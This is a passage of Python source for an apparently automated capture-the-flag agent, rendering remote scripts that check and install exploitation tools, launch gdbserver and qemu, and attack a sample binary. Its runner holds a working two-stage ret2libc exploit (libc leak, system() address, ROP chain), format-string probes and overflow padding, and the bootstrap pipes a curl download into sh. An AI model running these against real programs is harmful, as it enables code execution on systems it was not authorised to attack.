RAW_PAYLOADS = {
    str(item.get("label") or "").strip(): str(item.get("b64") or "").strip()
    for item in list(PROBE_SUMMARY.get("raw_payloads") or [])
    if str(item.get("label") or "").strip() and str(item.get("b64") or "").strip()
}
RET2LIBC_PLANS = [dict(item) for item in list(PROBE_SUMMARY.get("ret2libc_plans") or []) if isinstance(item, dict)]

def add_input(value):
    text = str(value or "").strip()
    if not text:
        return
    marker = text.lower()
    if marker in seen:
        return
    seen.add(marker)
    expanded_inputs.append(text)

def resolve_input_bytes(value):
    text = str(value or "").strip()
    if text.startswith("RAWPAYLOAD:"):
        label = text.split(":", 1)[1].strip()
        b64 = RAW_PAYLOADS.get(label, "")
        if b64:
            try:
                return label, base64.b64decode(b64) + b"\\n", "stdin-raw"
            except Exception:
                pass
    return text, (text + "\\n").encode(), "stdin-text"


def _decode_blob(data):
    if isinstance(data, (bytes, bytearray)):
        return data.decode(errors="replace")
    return str(data or "")


def _libc_metadata():
    line = ""
    try:
        completed = subprocess.run(["ldd", sample_path], capture_output=True, text=True, timeout=4)
        line = (completed.stdout or "") + "\\n" + (completed.stderr or "")
    except Exception:
        line = ""
    libc_path = ""
    for raw in line.splitlines():
        match = re.search(r"libc\\.so\\.6\\s*=>\\s*(\\S+)", raw)
        if match:
            libc_path = match.group(1)
            break
    if not libc_path:
        return {}
    try:
        from pwn import ELF

        libc = ELF(libc_path, checksec=False)
        return {
            "path": libc_path,
            "puts": int(libc.symbols.get("puts") or 0),
            "printf": int(libc.symbols.get("printf") or 0),
            "read": int(libc.symbols.get("read") or 0),
            "write": int(libc.symbols.get("write") or 0),
            "setvbuf": int(libc.symbols.get("setvbuf") or 0),
            "system": int(libc.symbols.get("system") or 0),
        }
    except Exception:
        return {}


def _run_process_bytes(payload_bytes, timeout=4):
    completed = subprocess.run(
        [sample_path],
        input=payload_bytes,
        capture_output=True,
        timeout=timeout,
    )
    return completed


def _try_ret2libc_plan(plan, timeout=4):
    label = str(plan.get("label") or "ret2libc").strip() or "ret2libc"
    stage1_b64 = str(plan.get("stage1_b64") or "").strip()
    attempt = {
        "input": label,
        "input_mode": "stdin-ret2libc",
        "stage": "ret2libc",
        "leak_symbol": str(plan.get("leak_symbol") or ""),
        "argument_preview": str(plan.get("argument_preview") or "")[:120],
    }
    if not stage1_b64:
        attempt["error"] = "missing stage1_b64"
        return attempt, ""
    try:
        stage1 = base64.b64decode(stage1_b64) + b"\\n"
    except Exception as exc:
        attempt["error"] = "invalid stage1_b64: {0}".format(exc)
        return attempt, ""
    try:
        leak_run = _run_process_bytes(stage1, timeout=timeout)
    except Exception as exc:
        attempt["error"] = str(exc)
        return attempt, ""
    attempt["returncode"] = leak_run.returncode
    leak_stdout = leak_run.stdout or b""
    leak_stderr = leak_run.stderr or b""
    attempt["stdout"] = _decode_blob(leak_stdout)[:12000]
    attempt["stderr"] = _decode_blob(leak_stderr)[:6000]
    marker = b"LEAK:"
    marker_index = leak_stdout.find(marker)
    if marker_index < 0 or len(leak_stdout) < marker_index + len(marker) + 8:
        attempt["error"] = "leak marker not found"
        return attempt, ""
    leak_bytes = leak_stdout[marker_index + len(marker): marker_index + len(marker) + 8]
    leak_addr = int.from_bytes(leak_bytes, "little")
    attempt["leak_hex"] = "0x{0:016x}".format(leak_addr)

    libc_meta = _libc_metadata()
    leak_symbol = str(plan.get("leak_symbol") or "puts").strip() or "puts"
    leak_offset = int(libc_meta.get(leak_symbol) or 0)
    system_offset = int(libc_meta.get("system") or 0)
    libc_path = str(libc_meta.get("path") or "")
    if not libc_path or not leak_offset or not system_offset:
        attempt["error"] = "missing libc metadata"
        attempt["libc_path"] = libc_path
        return attempt, ""
    try:
        offset = int(plan.get("offset") or 0)
        pop_rdi = int(str(plan.get("pop_rdi") or "0"), 16)
        argument = int(str(plan.get("argument") or "0"), 16)
        ret_addr = int(str(plan.get("ret") or "0"), 16) if str(plan.get("ret") or "").strip() else 0
    except Exception as exc:
        attempt["error"] = "invalid ret2libc plan: {0}".format(exc)
        return attempt, ""
    libc_base = leak_addr - leak_offset
    system_addr = libc_base + system_offset
    attempt["libc_path"] = libc_path
    attempt["libc_base_hex"] = "0x{0:016x}".format(libc_base)
    attempt["system_hex"] = "0x{0:016x}".format(system_addr)
    pack = lambda value: struct.pack("<Q", int(value))
    stage2 = (b"A" * offset)
    if ret_addr:
        stage2 += pack(ret_addr)
    stage2 += pack(pop_rdi) + pack(argument) + pack(system_addr) + b"\\n"
    try:
        final_run = _run_process_bytes(stage2, timeout=timeout)
    except Exception as exc:
        attempt["error"] = "stage2: {0}".format(exc)
        return attempt, ""
    stage2_stdout = final_run.stdout or b""
    stage2_stderr = final_run.stderr or b""
    attempt["stage2_returncode"] = final_run.returncode
    attempt["stage2_stdout"] = _decode_blob(stage2_stdout)[:12000]
    attempt["stage2_stderr"] = _decode_blob(stage2_stderr)[:6000]
    blob = _decode_blob(stage2_stdout) + "\\n" + _decode_blob(stage2_stderr)
    return attempt, blob

if __MODE__ == "pwn":
    for item in list(PROBE_SUMMARY.get("raw_payloads") or []):
        label = str(item.get("label") or "").strip()
        if label:
            add_input("RAWPAYLOAD:" + label)
    for item in RET2LIBC_PLANS:
        label = str(item.get("label") or "").strip()
        if label:
            add_input("RET2LIBC:" + label)
    for item in list(PROBE_SUMMARY.get("angr_candidate_inputs") or []):
        add_input(item)
    if TARGET_SYMBOL:
        add_input(TARGET_SYMBOL)
    for item in list(PROBE_SUMMARY.get("ret2win_symbols") or []):
        add_input(item)
    for item in list(PROBE_SUMMARY.get("fmt_clues") or []):
        if "%" in str(item):
            add_input("%p.%p.%p")
            add_input("%7$p")
            add_input("%7$s")
            break
    if ROP_HINTS:
        add_input("A" * 72)
        add_input("A" * 120)

for item in candidate_inputs[:10]:
    add_input(item)

ret2libc_solved = False
if __MODE__ == "pwn":
    for plan in RET2LIBC_PLANS[:3]:
        attempt, blob = _try_ret2libc_plan(plan)
        payload["attempts"].append(attempt)
        if "flag{" in str(blob or "").lower():
            payload["candidate_flags"].append({"value": blob.strip(), "source": "remote-runner-ret2libc"})
            ret2libc_solved = True
            break

for item in ([] if ret2libc_solved else expanded_inputs[:12]):
    text = str(item or "")
    display_input, input_blob, input_mode = resolve_input_bytes(text)
    attempt = {"input": display_input, "input_mode": input_mode}
    if display_input != text:
        attempt["input_source"] = text
    try:
        completed = subprocess.run(
            [sample_path],
            input=input_blob,
            capture_output=True,
            timeout=4,
        )
        attempt["returncode"] = completed.returncode
        stdout_text = (completed.stdout or b"").decode(errors="replace")
        stderr_text = (completed.stderr or b"").decode(errors="replace")
        attempt["stdout"] = stdout_text[:12000]
        attempt["stderr"] = stderr_text[:6000]
        blob = stdout_text + "\\n" + stderr_text
        if "flag{" in blob.lower():
            payload["candidate_flags"].append({"value": blob.strip(), "source": "remote-runner"})
    except Exception as exc:
        attempt["error"] = str(exc)
    payload["attempts"].append(attempt)

print(json.dumps(payload, ensure_ascii=False, indent=2))
"""
        rendered = textwrap.dedent(template).replace("__MODE__", repr(mode))
        rendered = rendered.replace("__TARGET_SYMBOL__", repr(str(payload.get("target_symbol") or "")), 1)
        rendered = rendered.replace("__ROP_HINTS__", repr(list(payload.get("rop_hints") or [])), 1)
        rendered = rendered.replace("__PROBE_SUMMARY__", repr(dict(payload.get("probe_summary") or {})), 1)
        return rendered

    def _resolve_template_remote_path(self, remote_workspace=None, filename="", remote_path=None, host_name=""):
        if remote_path:
            return self._normalize_remote_path(remote_path)
        if isinstance(remote_workspace, dict):
            script_root = remote_workspace.get("artifact_dir") or remote_workspace.get("workspace_root")
            if script_root:
                return self._normalize_remote_path(posixpath.join(script_root, filename))
        if isinstance(remote_workspace, str) and remote_workspace.strip():
            return self._normalize_remote_path(posixpath.join(remote_workspace.strip(), filename))
        host = self.hosts.get(host_name, {})
        base_dir = host.get("base_dir", self.DEFAULT_BASE_DIR)
        return self._normalize_remote_path(posixpath.join(base_dir, filename))

    def _render_pwn_env_doctor_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json
            import os
            import platform
            import shutil
            import subprocess
            import sys

            CORE_CAPABILITIES = ["gdb", "patchelf", "checksec", "radare2", "pwntools", "angr", "r2pipe"]
            ADVANCED_CAPABILITIES = ["gdbserver", "qemu_user", "pwninit", "one_gadget", "ropper"]
            UBUNTU_FAMILY_IDS = {"ubuntu", "debian", "kali", "linuxmint", "pop", "neon", "parrot", "raspbian"}

            sample_path = sys.argv[1] if len(sys.argv) > 1 else ""
            payload = {
                "status": "ok",
                "sample_path": sample_path,
                "tools": {},
                "python_modules": {},
            }

            def run_capture(command, timeout=8):
                try:
                    completed = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
                    return {
                        "returncode": completed.returncode,
                        "stdout": completed.stdout[:8000],
                        "stderr": completed.stderr[:4000],
                    }
                except Exception as exc:
                    return {"returncode": -1, "stdout": "", "stderr": str(exc)}

            def read_os_release():
                values = {}
                path = "/etc/os-release"
                if not os.path.exists(path):
                    return values
                try:
                    with open(path, "r", encoding="utf-8", errors="replace") as handle:
                        for raw in handle:
                            line = raw.strip()
                            if "=" not in line or line.startswith("#"):
                                continue
                            key, value = line.split("=", 1)
                            values[key.strip().lower()] = value.strip().strip('"').strip("'")
                except Exception:
                    return {}
                return values

            def build_recommended_templates(matrix):
                templates = ["pwn-env-doctor", "binary-checksec", "pwntools-probe", "input-bruteforce-lite"]
                if matrix.get("gdbserver"):
                    templates.append("pwn-gdbserver-launch")
                if matrix.get("qemu_user"):
                    templates.append("pwn-qemu-run")
                if matrix.get("libc_patch_tooling"):
                    templates.append("pwn-libc-setup")
                if matrix.get("pwninit"):
                    templates.append("pwninit-bootstrap")
                if matrix.get("one_gadget"):
                    templates.append("one-gadget-check")
                return templates

            def is_apt_compatible(host_profile):
                if host_profile.get("apt_get"):
                    return True
                os_id = str(host_profile.get("os_id") or "").strip().lower()
                os_like_tokens = {
                    token.strip().lower()
                    for token in str(host_profile.get("os_like") or "").replace(",", " ").split()
                    if token.strip()
                }
                if os_id in UBUNTU_FAMILY_IDS:
                    return True
                return bool(os_like_tokens.intersection(UBUNTU_FAMILY_IDS))

            for name, candidates in {
                "gdb": ["gdb"],
                "gdbserver": ["gdbserver"],
                "patchelf": ["patchelf"],
                "checksec": ["checksec"],
                "ropper": ["ropper"],
                "one_gadget": ["one_gadget"],
                "pwninit": ["pwninit"],
                "radare2": ["r2", "radare2"],
                "tmux": ["tmux"],
                "socat": ["socat"],
                "qemu_user": ["qemu-x86_64", "qemu-aarch64", "qemu-arm", "qemu-mipsel", "qemu-riscv64"],
            }.items():
                path = ""
                for candidate in candidates:
                    path = shutil.which(candidate) or ""
                    if path:
                        break
                payload["tools"][name] = {"available": bool(path), "path": path, "detail": path}

            debugger_name = ""
            gdbinit_path = os.path.expanduser("~/.gdbinit")
            if os.path.isfile(gdbinit_path):
                try:
                    gdbinit_text = open(gdbinit_path, "r", encoding="utf-8", errors="replace").read().lower()
                    if "pwndbg" in gdbinit_text:
                        debugger_name = "pwndbg"
                    elif "gef" in gdbinit_text:
                        debugger_name = "gef"
                except Exception:
                    debugger_name = ""
            payload["tools"]["pwndbg_or_gef"] = {
                "available": bool(debugger_name),
                "path": "",
                "detail": debugger_name,
            }

            module_checks = {
                "pwntools": "import pwn; print(getattr(pwn, '__file__', 'ok'))",
                "angr": "import angr; print(getattr(angr, '__file__', 'ok'))",
                "r2pipe": "import r2pipe; print(getattr(r2pipe, '__file__', 'ok'))",
            }
            for module_name, import_code in module_checks.items():
                result = run_capture([sys.executable, "-c", import_code])
                payload["python_modules"][module_name] = {
                    "available": result["returncode"] == 0,
                    "detail": (result["stdout"] or result["stderr"]).strip()[:400],
                }

            os_release = read_os_release()
            payload["host_profile"] = {
                "os_id": str(os_release.get("id") or "").strip().lower(),
                "os_like": str(os_release.get("id_like") or "").strip().lower(),
                "apt_get": bool(shutil.which("apt-get")),
                "apt_get_path": shutil.which("apt-get") or "",
                "python_bin": sys.executable,
                "platform": platform.platform(),
            }
            payload["host_profile"]["apt_compatible"] = is_apt_compatible(payload["host_profile"])

            matrix = {}
            for name, item in payload["tools"].items():
                matrix[name] = bool(item.get("available"))
            for module_name, item in payload["python_modules"].items():
                matrix[module_name] = bool(item.get("available"))
            matrix["pwndbg_or_gef"] = bool(payload["tools"]["pwndbg_or_gef"].get("detail"))
            matrix["libc_patch_tooling"] = bool(matrix.get("patchelf") or matrix.get("pwninit"))

            core_missing = [name for name in CORE_CAPABILITIES if not matrix.get(name)]
            advanced_missing = [name for name in ADVANCED_CAPABILITIES if not matrix.get(name)]
            debugger_missing = [] if matrix.get("pwndbg_or_gef") else ["pwndbg_or_gef"]
            if core_missing:
                parity_profile = "weak"
            elif advanced_missing or debugger_missing:
                parity_profile = "usable"
            else:
                parity_profile = "ready"

            payload.update({
                "pwndbg_or_gef": matrix.get("pwndbg_or_gef", False),
                "libc_patch_tooling": matrix.get("libc_patch_tooling", False),
                "missing": core_missing + advanced_missing,
                "recommended_templates": build_recommended_templates(matrix),
                "parity_profile": parity_profile,
                "core_missing": core_missing,
                "advanced_missing": advanced_missing,
                "debugger_missing": debugger_missing,
                "bootstrap_recommended": bool(payload["host_profile"].get("apt_compatible") and parity_profile != "ready"),
                "suggested_template": "pwn-ubuntu-bootstrap" if payload["host_profile"].get("apt_compatible") and parity_profile != "ready" else "",
            })

            def run_checksec_capture(path, timeout=10):
                if not shutil.which("checksec"):
                    return {}
                report = run_capture(["checksec", "--file", path], timeout=timeout)
                text = ((report.get("stdout") or "") + "\\n" + (report.get("stderr") or "")).lower()
                if "unknown option file" in text or "no option selected" in text:
                    report = run_capture(["checksec", "--file=" + path], timeout=timeout)
                    text = ((report.get("stdout") or "") + "\\n" + (report.get("stderr") or "")).lower()
                    if "unknown option file" in text or "no option selected" in text:
                        report = run_capture(["checksec", path], timeout=timeout)
                return report

            if sample_path and os.path.exists(sample_path):
                payload["sample"] = {
                    "exists": True,
                    "file": run_capture(["file", sample_path]) if shutil.which("file") else {},
                    "checksec": run_checksec_capture(sample_path, timeout=10),
                }
            else:
                payload["sample"] = {"exists": False}

            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        )

    def _render_pwn_ubuntu_bootstrap_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json
            import os
            import platform
            import shutil
            import subprocess
            import sys
            import tempfile
            import urllib.request
            from pathlib import Path

            CORE_CAPABILITIES = ["gdb", "patchelf", "checksec", "radare2", "pwntools", "angr", "r2pipe"]
            ADVANCED_CAPABILITIES = ["gdbserver", "qemu_user", "pwninit", "one_gadget", "ropper"]
            UBUNTU_FAMILY_IDS = {"ubuntu", "debian", "kali", "linuxmint", "pop", "neon", "parrot", "raspbian"}
            APT_PACKAGES = [
                "gdb",
                "gdbserver",
                "gdb-multiarch",
                "rr",
                "patchelf",
                "socat",
                "tmux",
                "qemu-user",
                "qemu-user-static",
                "ruby-full",
                "python3",
                "python3-pip",
                "python3-venv",
                "build-essential",
                "git",
                "curl",
                "file",
                "unzip",
                "binutils",
                "checksec",
                "radare2",
            ]
            PYTHON_PACKAGES = [
                ("pwntools", "pwn", "import pwn; print(getattr(pwn, '__file__', 'ok'))"),
                ("angr", "angr", "import angr; print(getattr(angr, '__file__', 'ok'))"),
                ("r2pipe", "r2pipe", "import r2pipe; print(getattr(r2pipe, '__file__', 'ok'))"),
                ("ropper", "ropper", "import ropper; print(getattr(ropper, '__file__', 'ok'))"),
            ]

            payload = {
                "status": "warn",
                "installed": [],
                "skipped": [],
                "warnings": [],
                "failed_steps": [],
                "final_probe": {},
            }

            def run_capture(command, timeout=120):
                try:
                    completed = subprocess.run(command, capture_output=True, text=True, timeout=timeout)
                    return {
                        "command": list(command),
                        "returncode": completed.returncode,
                        "stdout": completed.stdout[:12000],
                        "stderr": completed.stderr[:8000],
                    }
                except Exception as exc:
                    return {
                        "command": list(command),
                        "returncode": -1,
                        "stdout": "",
                        "stderr": str(exc),
                    }

            def record_failure(step, result, warning_message=""):
                payload["failed_steps"].append(
                    {
                        "step": step,
                        "command": list(result.get("command") or []),
                        "returncode": result.get("returncode"),
                        "stdout": result.get("stdout", ""),
                        "stderr": result.get("stderr", ""),
                    }
                )
                if warning_message:
                    payload["warnings"].append(warning_message)

            def read_os_release():
                values = {}
                path = "/etc/os-release"
                if not os.path.exists(path):
                    return values
                try:
                    with open(path, "r", encoding="utf-8", errors="replace") as handle:
                        for raw in handle:
                            line = raw.strip()
                            if "=" not in line or line.startswith("#"):
                                continue
                            key, value = line.split("=", 1)
                            values[key.strip().lower()] = value.strip().strip('"').strip("'")
                except Exception:
                    return {}
                return values

            def is_apt_compatible(host_profile):
                if host_profile.get("apt_get"):
                    return True
                os_id = str(host_profile.get("os_id") or "").strip().lower()
                os_like_tokens = {
                    token.strip().lower()
                    for token in str(host_profile.get("os_like") or "").replace(",", " ").split()
                    if token.strip()
                }
                if os_id in UBUNTU_FAMILY_IDS:
                    return True
                return bool(os_like_tokens.intersection(UBUNTU_FAMILY_IDS))

            def build_host_profile():
                os_release = read_os_release()
                profile = {
                    "os_id": str(os_release.get("id") or "").strip().lower(),
                    "os_like": str(os_release.get("id_like") or "").strip().lower(),
                    "apt_get": bool(shutil.which("apt-get")),
                    "apt_get_path": shutil.which("apt-get") or "",
                    "python_bin": sys.executable,
                    "platform": platform.platform(),
                    "arch": platform.machine(),
                }
                profile["apt_compatible"] = is_apt_compatible(profile)
                return profile

            def build_recommended_templates(matrix):
                templates = ["pwn-env-doctor", "binary-checksec", "pwntools-probe", "input-bruteforce-lite"]
                if matrix.get("gdbserver"):
                    templates.append("pwn-gdbserver-launch")
                if matrix.get("qemu_user"):
                    templates.append("pwn-qemu-run")
                if matrix.get("libc_patch_tooling"):
                    templates.append("pwn-libc-setup")
                if matrix.get("pwninit"):
                    templates.append("pwninit-bootstrap")
                if matrix.get("one_gadget"):
                    templates.append("one-gadget-check")
                return templates

            def collect_probe():
                probe = {
                    "status": "ok",
                    "tools": {},
                    "python_modules": {},
                    "host_profile": build_host_profile(),
                }
                for name, candidates in {
                    "gdb": ["gdb"],
                    "gdbserver": ["gdbserver"],
                    "patchelf": ["patchelf"],
                    "checksec": ["checksec"],
                    "ropper": ["ropper"],
                    "one_gadget": ["one_gadget"],
                    "pwninit": ["pwninit"],
                    "radare2": ["r2", "radare2"],
                    "tmux": ["tmux"],
                    "socat": ["socat"],
                    "qemu_user": ["qemu-x86_64", "qemu-aarch64", "qemu-arm", "qemu-mipsel", "qemu-riscv64"],
                }.items():
                    path = ""
                    for candidate in candidates:
                        path = shutil.which(candidate) or ""
                        if path:
                            break
                    probe["tools"][name] = {"available": bool(path), "path": path, "detail": path}

                debugger_name = ""
                gdbinit_path = Path.home() / ".gdbinit"
                if gdbinit_path.exists():
                    try:
                        gdbinit_text = gdbinit_path.read_text(encoding="utf-8", errors="replace").lower()
                        if "pwndbg" in gdbinit_text:
                            debugger_name = "pwndbg"
                        elif "gef" in gdbinit_text:
                            debugger_name = "gef"
                    except Exception:
                        debugger_name = ""
                probe["tools"]["pwndbg_or_gef"] = {
                    "available": bool(debugger_name),
                    "path": "",
                    "detail": debugger_name,
                }

                for package_name, module_name, import_code in PYTHON_PACKAGES:
                    result = run_capture([sys.executable, "-c", import_code], timeout=20)
                    probe["python_modules"][package_name] = {
                        "available": result["returncode"] == 0,
                        "detail": (result["stdout"] or result["stderr"]).strip()[:400],
                        "module_name": module_name,
                    }

                matrix = {}
                for name, item in probe["tools"].items():
                    matrix[name] = bool(item.get("available"))
                for package_name, item in probe["python_modules"].items():
                    matrix[package_name] = bool(item.get("available"))
                matrix["pwndbg_or_gef"] = bool(probe["tools"]["pwndbg_or_gef"].get("detail"))
                matrix["libc_patch_tooling"] = bool(matrix.get("patchelf") or matrix.get("pwninit"))

                core_missing = [name for name in CORE_CAPABILITIES if not matrix.get(name)]
                advanced_missing = [name for name in ADVANCED_CAPABILITIES if not matrix.get(name)]
                debugger_missing = [] if matrix.get("pwndbg_or_gef") else ["pwndbg_or_gef"]
                if core_missing:
                    parity_profile = "weak"
                elif advanced_missing or debugger_missing:
                    parity_profile = "usable"
                else:
                    parity_profile = "ready"

                probe.update(
                    {
                        "pwndbg_or_gef": matrix.get("pwndbg_or_gef", False),
                        "libc_patch_tooling": matrix.get("libc_patch_tooling", False),
                        "missing": core_missing + advanced_missing,
                        "recommended_templates": build_recommended_templates(matrix),
                        "parity_profile": parity_profile,
                        "core_missing": core_missing,
                        "advanced_missing": advanced_missing,
                        "debugger_missing": debugger_missing,
                        "bootstrap_recommended": bool(probe["host_profile"].get("apt_compatible") and parity_profile != "ready"),
                        "suggested_template": "pwn-ubuntu-bootstrap" if probe["host_profile"].get("apt_compatible") and parity_profile != "ready" else "",
                    }
                )
                return probe

            def package_installed(name):
                result = run_capture(["dpkg-query", "-W", "-f=${Status}", name], timeout=8)
                text = (result.get("stdout") or "").lower()
                return result.get("returncode") == 0 and "install ok installed" in text

            def command_with_optional_sudo(command):
                if os.geteuid() == 0 or not shutil.which("sudo"):
                    return list(command)
                return ["sudo"] + list(command)

            def install_pwninit():
                if shutil.which("pwninit"):
                    payload["skipped"].append("binary:pwninit")
                    return
                step = "pwninit"
                api_url = "https://api.github.com/repos/io12/pwninit/releases/latest"
                arch = platform.machine().lower()
                arch_tokens = {
                    "x86_64": ["x86_64", "amd64"],
                    "amd64": ["x86_64", "amd64"],
                    "aarch64": ["aarch64", "arm64"],
                    "arm64": ["aarch64", "arm64"],
                }.get(arch, [arch])
                try:
                    request = urllib.request.Request(api_url, headers={"User-Agent": "ctf-agent-bootstrap/1.0"})
                    with urllib.request.urlopen(request, timeout=20) as response:
                        release = json.load(response)
                except Exception as exc:
                    payload["warnings"].append("pwninit latest release lookup failed: {0}".format(exc))
                    payload["failed_steps"].append({"step": step, "command": [api_url], "returncode": -1, "stdout": "", "stderr": str(exc)})
                    return

                chosen = None
                assets = list(release.get("assets") or [])
                for token in arch_tokens:
                    for asset in assets:
                        name = str(asset.get("name") or "").lower()
                        if token in name and ("linux" in name or "musl" in name or name.startswith("pwninit")):
                            chosen = asset
                            break
                    if chosen:
                        break
                if not chosen:
                    for asset in assets:
                        name = str(asset.get("name") or "").lower()
                        if "linux" in name or name == "pwninit":
                            chosen = asset
                            break
                if not chosen:
                    payload["warnings"].append("pwninit latest release does not expose a compatible Linux asset")
                    payload["failed_steps"].append({"step": step, "command": [api_url], "returncode": -1, "stdout": "", "stderr": "compatible asset not found"})
                    return

                download_url = str(chosen.get("browser_download_url") or "").strip()
                if not download_url:
                    payload["warnings"].append("pwninit asset is missing browser_download_url")
                    payload["failed_steps"].append({"step": step, "command": [api_url], "returncode": -1, "stdout": "", "stderr": "missing browser_download_url"})
                    return

                temp_path = ""
                try:
                    request = urllib.request.Request(download_url, headers={"User-Agent": "ctf-agent-bootstrap/1.0"})
                    with urllib.request.urlopen(request, timeout=30) as response:
                        blob = response.read()
                    with tempfile.NamedTemporaryFile(prefix="ctf-agent-pwninit-", delete=False) as handle:
                        handle.write(blob)
                        temp_path = handle.name
                    os.chmod(temp_path, 0o755)
                    result = run_capture(command_with_optional_sudo(["install", "-m", "0755", temp_path, "/usr/local/bin/pwninit"]), timeout=30)
                    if result["returncode"] == 0:
                        payload["installed"].append("binary:pwninit")
                    else:
                        record_failure(step, result, "pwninit install failed; continuing without hard failure")
                except Exception as exc:
                    payload["warnings"].append("pwninit download/install failed: {0}".format(exc))
                    payload["failed_steps"].append({"step": step, "command": [download_url], "returncode": -1, "stdout": "", "stderr": str(exc)})
                finally:
                    if temp_path and os.path.exists(temp_path):
                        try:
                            os.remove(temp_path)
                        except Exception:
                            pass

            def install_pwndbg():
                gdbinit_path = Path.home() / ".gdbinit"
                existing_text = ""
                if gdbinit_path.exists():
                    try:
                        existing_text = gdbinit_path.read_text(encoding="utf-8", errors="replace")
                    except Exception:
                        existing_text = ""
                lowered = existing_text.lower()
                if "pwndbg" in lowered or "gef" in lowered:
                    payload["skipped"].append("pwndbg")
                    return

                command = ["bash", "-lc", "curl -qsL https://install.pwndbg.re | sh -s -- -t pwndbg-gdb"]
                result = run_capture(command, timeout=300)
                if result["returncode"] != 0:
                    record_failure("pwndbg", result, "pwndbg install failed; continuing with existing debugger state")
                    return

                generated_text = ""
                try:
                    generated_text = gdbinit_path.read_text(encoding="utf-8", errors="replace")
                except Exception:
                    generated_text = ""

                source_line = ""
                for raw in generated_text.splitlines():
                    line = raw.strip()
                    if line.startswith("source ") and ("pwndbg" in line.lower() or "gdbinit.py" in line.lower()):
                        source_line = line
                        break

                if existing_text:
                    if source_line:
                        guard_begin = "# >>> ctf-agent pwndbg >>>"
                        guard_end = "# <<< ctf-agent pwndbg <<<"
                        if guard_begin not in existing_text and source_line not in existing_text:
                            merged = existing_text.rstrip() + "\\n\\n" + "\\n".join([guard_begin, source_line, guard_end]) + "\\n"
                            gdbinit_path.write_text(merged, encoding="utf-8")
                        else:
                            gdbinit_path.write_text(existing_text, encoding="utf-8")
                    else:
                        gdbinit_path.write_text(existing_text, encoding="utf-8")
                        payload["warnings"].append("pwndbg installer completed but no source line was found for guarded merge")

                payload["installed"].append("pwndbg")

            host_profile = build_host_profile()
            payload["host_profile"] = host_profile
            if not host_profile.get("apt_compatible"):
                payload["status"] = "unsupported"
                payload["warnings"].append("host is not Ubuntu/Debian-like or apt-get is unavailable")
                payload["final_probe"] = collect_probe()
                print(json.dumps(payload, ensure_ascii=False, indent=2))
                raise SystemExit(0)

            apt_update = run_capture(command_with_optional_sudo(["apt-get", "update"]), timeout=240)
            if apt_update["returncode"] == 0:
                payload["installed"].append("apt-get-update")
            else:
                record_failure("apt-get-update", apt_update, "apt-get update failed")

            missing_apt_packages = [name for name in APT_PACKAGES if not package_installed(name)]
            for name in APT_PACKAGES:
                if name not in missing_apt_packages:
                    payload["skipped"].append("apt:{0}".format(name))
            if missing_apt_packages:
                apt_install = run_capture(command_with_optional_sudo(["apt-get", "install", "-y"] + missing_apt_packages), timeout=900)
                if apt_install["returncode"] == 0:
                    payload["installed"].extend(["apt:{0}".format(name) for name in missing_apt_packages])
                else:
                    record_failure("apt-packages", apt_install, "apt package install failed")

            missing_python_packages = []
            for package_name, module_name, import_code in PYTHON_PACKAGES:
                result = run_capture([sys.executable, "-c", import_code], timeout=20)
                if result["returncode"] == 0:
                    payload["skipped"].append("pip:{0}".format(package_name))
                else:
                    missing_python_packages.append(package_name)
            if missing_python_packages:
                pip_install = run_capture([sys.executable, "-m", "pip", "install", "--upgrade"] + missing_python_packages, timeout=900)
                if pip_install["returncode"] == 0:
                    payload["installed"].extend(["pip:{0}".format(name) for name in missing_python_packages])
                else:
                    record_failure("python-packages", pip_install, "python package install failed")

            if shutil.which("one_gadget"):
                payload["skipped"].append("gem:one_gadget")
            else:
                gem_install = run_capture(command_with_optional_sudo(["gem", "install", "one_gadget", "--no-document"]), timeout=600)
                if gem_install["returncode"] == 0:
                    payload["installed"].append("gem:one_gadget")
                else:
                    record_failure("one_gadget", gem_install, "one_gadget gem install failed")

            install_pwninit()
            install_pwndbg()

            payload["final_probe"] = collect_probe()
            final_profile = str(payload["final_probe"].get("parity_profile") or "weak")
            if payload["status"] != "unsupported":
                if final_profile == "ready" and not payload["failed_steps"]:
                    payload["status"] = "ok" if not payload["warnings"] else "warn"
                else:
                    payload["status"] = "warn"

            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        )

    def _render_pwn_gdbserver_launch_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json
            import os
            import shutil
            import subprocess
            import sys
            import time

            if len(sys.argv) < 3:
                raise SystemExit("usage: remote_pwn_gdbserver_launch.py <sample_path> <listen_port> [program_args_json]")

            sample_path = sys.argv[1]
            listen_port = int(sys.argv[2] or 31337)
            program_args = json.loads(sys.argv[3] or "[]") if len(sys.argv) > 3 else []
            gdbserver = shutil.which("gdbserver")
            payload = {"status": "error", "sample_path": sample_path, "listen_port": listen_port}
            if not gdbserver:
                payload["message"] = "gdbserver is not installed"
                print(json.dumps(payload, ensure_ascii=False, indent=2))
                raise SystemExit(0)

            try:
                st = os.stat(sample_path)
                os.chmod(sample_path, st.st_mode | 0o111)
            except Exception:
                pass

            log_path = "/tmp/ctf-agent-gdbserver-{0}.log".format(int(time.time()))
            with open(log_path, "w", encoding="utf-8") as handle:
                process = subprocess.Popen(
                    [gdbserver, "0.0.0.0:{0}".format(listen_port), sample_path] + list(program_args),
                    stdout=handle,
                    stderr=subprocess.STDOUT,
                )
            payload.update({"status": "ok", "pid": process.pid, "log_path": log_path})
            print(json.dumps(payload, ensure_ascii=False, indent=2))
            """
        )

    def _render_pwn_qemu_run_template(self):
        return textwrap.dedent(
            """\
            #!/usr/bin/env python3
            import json
            import shutil
            import subprocess
            import sys

            if len(sys.argv) < 3:
                raise SystemExit("usage: remote_pwn_qemu_run.py <sample_path> <qemu_bin> [binary_args_json]")

            sample_path = sys.argv[1]
            qemu_bin = (sys.argv[2] or "").strip()
            binary_args = json.loads(sys.argv[3] or "[]") if len(sys.argv) > 3 else []
            if not qemu_bin:
                for candidate in ["qemu-x86_64", "qemu-aarch64", "qemu-arm", "qemu-mipsel", "qemu-riscv64"]:
                    if shutil.which(candidate):
                        qemu_bin = candidate
                        break
            payload = {"status": "error", "sample_path": sample_path, "qemu_bin": qemu_bin, "binary_args": binary_args}
            if not qemu_bin:
                payload["message"] = "no qemu-user binary is available"
                print(json.dumps(payload, ensure_ascii=False, indent=2))
                raise SystemExit(0)

            try:
                completed = subprocess.run([qemu_bin, sample_path] + list(binary_args), capture_output=True, text=True, timeout=10)
                payload.update({
                    "status": "ok" if completed.returncode == 0 else "error",
                    "returncode": completed.returncode,
